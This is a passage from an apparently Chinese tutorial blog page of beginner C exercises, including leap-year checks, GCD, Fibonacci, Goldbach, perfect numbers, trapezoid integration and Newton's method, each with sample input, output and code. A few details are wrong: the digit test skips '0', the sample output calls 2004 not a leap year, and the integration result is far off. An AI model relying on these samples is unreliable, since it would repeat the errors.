<span class="number">5</span> 个</span><br><span class="line">空格有： <span class="number">1</span> 个</span><br><span class="line">其他有： <span class="number">2</span> 个</span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> zimu, shuzi, kongge, other;</span><br><span class="line">    zimu = shuzi = kongge = other = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">while</span>( ( ch = getchar() ) != <span class="string">'\n'</span>)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (ch &gt;= <span class="string">'a'</span> &amp;&amp; ch &lt;= <span class="string">'z'</span>) || (ch &gt;= <span class="string">'A'</span> &amp;&amp; ch &lt;= <span class="string">'Z'</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            zimu++;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>( ch &gt;= <span class="string">'1'</span> &amp;&amp; ch &lt;= <span class="string">'9'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            shuzi++;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>( ch == <span class="string">' '</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            kongge++;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            other++;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"字母有： %d 个\n"</span>, zimu);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"数字有： %d 个\n"</span>, shuzi);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"空格有： %d 个\n"</span>, kongge);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"其他有： %d 个\n"</span>, other);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-判断闰年"><a href="#6-判断闰年" class="headerlink" title="6 判断闰年"></a>6 判断闰年</h2><p><strong>样例输入</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1900</span></span><br><span class="line"><span class="number">2004</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1900 </span>year is <span class="keyword">not</span> leap year</span><br><span class="line"><span class="symbol">2004 </span>year <span class="keyword">not</span> leap year</span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="keyword">int</span> main()&#123;</span><br><span class="line">    <span class="keyword">int</span> year;</span><br><span class="line">    scanf(<span class="string">"%d"</span>,&amp;year);</span><br><span class="line">    <span class="keyword">if</span>((year%4==<span class="number">0</span> &amp;&amp; year%100!=<span class="number">0</span>) || year%400==<span class="number">0</span>)&#123;  <span class="regexp">//</span>判断闰年的条件</span><br><span class="line">        <span class="keyword">printf</span>(<span class="string">"%d year is leap year\n"</span>, year);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">printf</span>(<span class="string">"%d year is not leap year\n"</span>, year);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-百分制成绩和等级制成绩转换"><a href="#7-百分制成绩和等级制成绩转换" class="headerlink" title="7 百分制成绩和等级制成绩转换"></a>7 百分制成绩和等级制成绩转换</h2><p><strong>题目描述</strong><br><img src="/2020/01/26/C_C++_02/20200307112023.png" alt><br><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    <span class="keyword">char</span> result;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;score);</span><br><span class="line">    &#125;<span class="keyword">while</span>(score&lt;<span class="number">0</span> || score&gt;<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">switch</span>((<span class="keyword">int</span>)(score/<span class="number">10</span>))&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:                    <span class="comment">//注意switch case语句使用，case仅能常量</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:result=<span class="string">'A'</span>;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:result=<span class="string">'B'</span>;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:result=<span class="string">'C'</span>;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:result=<span class="string">'D'</span>;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:result=<span class="string">'E'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c"</span>,result);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-求两数最大公因数和最小公倍数-辗转相除法-欧几里得算法"><a href="#8-求两数最大公因数和最小公倍数-辗转相除法-欧几里得算法" class="headerlink" title="8 求两数最大公因数和最小公倍数(辗转相除法/欧几里得算法)"></a>8 求两数最大公因数和最小公倍数(辗转相除法/欧几里得算法)</h2><p><strong>算法原理</strong><br><img src="/2020/01/26/C_C++_02/20200307113455.png" alt><br><strong>样例输入</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">3139 </span><span class="number">2117</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最大公约数 <span class="number">73</span>,最小公倍数 <span class="number">91031</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b,m,n,o;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;a,&amp;b);</span><br><span class="line">    m=a;</span><br><span class="line">    n=b;</span><br><span class="line">    <span class="keyword">if</span>(a&lt;b)&#123;    <span class="comment">//a&lt;b则交换顺序</span></span><br><span class="line">        m=b;</span><br><span class="line">        n=a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(n!=<span class="number">0</span>)&#123;    <span class="comment">//辗转相除法</span></span><br><span class="line">        o=m%n;</span><br><span class="line">        m=n;</span><br><span class="line">        n=o;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"最大公约数 %d,最小公倍数 %d\n"</span>,m,a*b/m);    <span class="comment">//最小公约数最小公倍数关系</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="9-求斐波拉契数列有限项-递归应用"><a href="#9-求斐波拉契数列有限项-递归应用" class="headerlink" title="9 求斐波拉契数列有限项(递归应用)"></a>9 求斐波拉契数列有限项(递归应用)</h2><p><strong>样例输入</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">34</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#<span class="keyword">include</span> &lt;stdio.h&gt;</span><br><span class="line"><span class="built_in">int</span> <span class="constructor">Fibonacci(<span class="params">int</span> <span class="params">n</span>)</span>;</span><br><span class="line"><span class="built_in">int</span> main<span class="literal">()</span>&#123;</span><br><span class="line">    <span class="built_in">int</span> n;</span><br><span class="line">    scanf(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    printf(<span class="string">"%d"</span>,<span class="constructor">Fibonacci(<span class="params">n</span>)</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> <span class="constructor">Fibonacci(<span class="params">int</span> <span class="params">n</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span><span class="operator"> || </span>n==<span class="number">2</span>)&#123;</span><br><span class="line">        return <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        return <span class="constructor">Fibonacci(<span class="params">n</span>-1)</span>+<span class="constructor">Fibonacci(<span class="params">n</span>-2)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10-验证哥德巴赫猜想-素数验证应用"><a href="#10-验证哥德巴赫猜想-素数验证应用" class="headerlink" title="10 验证哥德巴赫猜想(素数验证应用)"></a>10 验证哥德巴赫猜想(素数验证应用)</h2><p><strong>题目描述</strong></p><p>&emsp;&emsp;数学领域著名的“哥德巴赫猜想”的大致意思是：任何一个大于2的偶数总能表示为两个素数之和。比如：24=5+19，其中5和19都是素数。本实验的任务是设计一个程序，验证20亿以内的偶数都可以分解成两个素数之和。</p><p><strong>样例输入</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">42</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">42 </span>= <span class="number">5</span> + <span class="number">37</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_prime</span><span class="params">(<span class="keyword">int</span> num)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,i;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_prime(i) &amp;&amp; is_prime(n-i))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d = %d + %d\n"</span>,n,i,n-i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_prime</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,k;</span><br><span class="line">    k=<span class="built_in">sqrt</span>(num);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=k;i++)&#123;  <span class="comment">//素数验证可简化为仅需判断是否能够被 2~√n 之间整数整除即可</span></span><br><span class="line">        <span class="keyword">if</span>(num%i==<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;=k)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="11-水仙花数"><a href="#11-水仙花数" class="headerlink" title="11 水仙花数"></a>11 水仙花数</h2><p><strong>题目描述</strong><br><img src="/2020/01/26/C_C++_02/20200225155427.png" alt><br><strong>样例输出</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">153 </span><span class="number">370</span> <span class="number">371</span> <span class="number">407</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,ge,shi,bai;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">100</span>;i&lt;=<span class="number">999</span>;i++)&#123;</span><br><span class="line">        ge=i%<span class="number">10</span>;</span><br><span class="line">        shi=(i%<span class="number">100</span>)/<span class="number">10</span>;</span><br><span class="line">        bai=i/<span class="number">100</span>;</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="built_in">pow</span>(ge,<span class="number">3</span>)+<span class="built_in">pow</span>(shi,<span class="number">3</span>)+<span class="built_in">pow</span>(bai,<span class="number">3</span>))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>,i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="12-完全平方数"><a href="#12-完全平方数" class="headerlink" title="12 完全平方数"></a>12 完全平方数</h2><p><strong>题目描述</strong></p><p>&emsp;&emsp;一个整数，它加上100 后是一个完全平方数，再加上168 又是一个完全平方数，请问该数是多少？</p><p>&emsp;&emsp;完全平方数：开方之后是整数<br><strong>样例输出</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">21 </span><span class="number">261</span> <span class="number">1581</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,num1,num2;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000</span>;i++)&#123;</span><br><span class="line">        num1=i+<span class="number">100</span>;</span><br><span class="line">        num2=num1+<span class="number">168</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">sqrt</span>(num1)==(<span class="keyword">int</span>)<span class="built_in">sqrt</span>(num1) &amp;&amp; <span class="built_in">sqrt</span>(num2)==(<span class="keyword">int</span>)<span class="built_in">sqrt</span>(num2))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>,i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="13-完数"><a href="#13-完数" class="headerlink" title="13 完数"></a>13 完数</h2><p><strong>题目描述</strong><br><img src="/2020/01/26/C_C++_02/20200225155836.png" alt><br>&emsp;&emsp;它所有的真因子（即除了自身以外的约数）的和（即因子函数），恰好等于它本身,1 不是完数<br><strong>样例输出</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">6 </span>is factors are <span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">28 </span>is factors are <span class="number">1</span> <span class="number">2</span> <span class="number">4</span> <span class="number">7</span> <span class="number">14</span></span><br><span class="line"><span class="symbol">496 </span>is factors are <span class="number">1</span> <span class="number">2</span> <span class="number">4</span> <span class="number">8</span> <span class="number">16</span> <span class="number">31</span> <span class="number">62</span> <span class="number">124</span> <span class="number">248</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;math.h&gt;</span></span><br><span class="line">int main()&#123;</span><br><span class="line">    int i,j,s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="attribute">i</span>=2;i&lt;=1000;i++)&#123;</span><br><span class="line">        <span class="attribute">s</span>=0;</span><br><span class="line">        <span class="keyword">for</span>(<span class="attribute">j</span>=1;j&lt;i;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="attribute">j</span>==0)&#123;</span><br><span class="line">                s+=j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="attribute">s</span>==i)&#123;</span><br><span class="line">            printf(<span class="string">"%d is factors are "</span>,i);</span><br><span class="line">            <span class="keyword">for</span>(<span class="attribute">j</span>=1;j&lt;i;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i%<span class="attribute">j</span>==0)&#123;</span><br><span class="line">                    printf(<span class="string">"%d "</span>,j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            printf(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="14-梯形法求定积分近似值"><a href="#14-梯形法求定积分近似值" class="headerlink" title="14 梯形法求定积分近似值"></a>14 梯形法求定积分近似值</h2><p><strong>题目描述</strong></p><p>&emsp;&emsp;求函数X^2的定积分近似值</p><p><strong>样例输入</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0 </span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0.353804</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">seekSimilar</span><span class="params">(<span class="keyword">float</span> a,<span class="keyword">float</span> b,<span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">func</span><span class="params">(<span class="keyword">float</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> a,b;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%f%f"</span>,&amp;a,&amp;b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%f"</span>, seekSimilar(a,b,<span class="number">50</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">seekSimilar</span><span class="params">(<span class="keyword">float</span> a,<span class="keyword">float</span> b,<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> h,i,s=<span class="number">0</span>;</span><br><span class="line">    h=(b-a)/n;  <span class="comment">//将区间划为n份 </span></span><br><span class="line">    <span class="keyword">for</span>(i=a;i&lt;b;i+=h)&#123;</span><br><span class="line">        s+=(func(i)+func(i+h))*h/<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">func</span><span class="params">(<span class="keyword">float</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(x,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="15-牛顿迭代法求多元方程根"><a href="#15-牛顿迭代法求多元方程根" class="headerlink" title="15 牛顿迭代法求多元方程根"></a>15 牛顿迭代法求多元方程根</h2><p><strong>题目描述</strong><br><img src="/2020/01/26/C_C++_02/20200311125406.png" alt><br><img src="/2020/01/26/C_C++_02/20200311125438.png" alt><br><strong>样例输出</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.000000</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> x0,x1,f,f1;</span><br><span class="line">    x1=<span class="number">1.5</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        x0=x1;</span><br><span class="line">        f=<span class="number">2</span>*<span class="built_in">pow</span>(x0,<span class="number">3</span>)<span class="number">-4</span>*<span class="built_in">pow</span>(x0,<span class="number">2</span>)+<span class="number">3</span>*x0<span class="number">-6</span>;</span><br><span class="line">        f1=<span class="number">6</span>*<span class="built_in">pow</span>(x0,<span class="number">2</span>)<span class="number">-8</span>*x0+<span class="number">3</span>;</span><br><span class="line">        x1=x0-f/f1;</span><br><span class="line">    &#125;<span class="keyword">while</span>(<span class="built_in">fabs</span>(x1-x0)&gt;=<span class="number">1e-5</span>);  <span class="comment">//注意判断条件</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%f\n"</span>,x1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="16-二分法求多次方根"><a href="#16-二分法求多次方根" class="headerlink" title="16 二分法求多次方根"></a>16 二分法求多次方根</h2><p><strong>题目描述</strong><br><img src="/2020/01/26/C_C++_02/20200311132117.png" alt><br><img src="/2020/01/26/C_C++_02/20200311132143.png" alt><br><strong>样例输入</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enter x1,x2:<span class="number">-10</span>,<span class="number">10</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">x</span>=  <span class="number">2.00</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 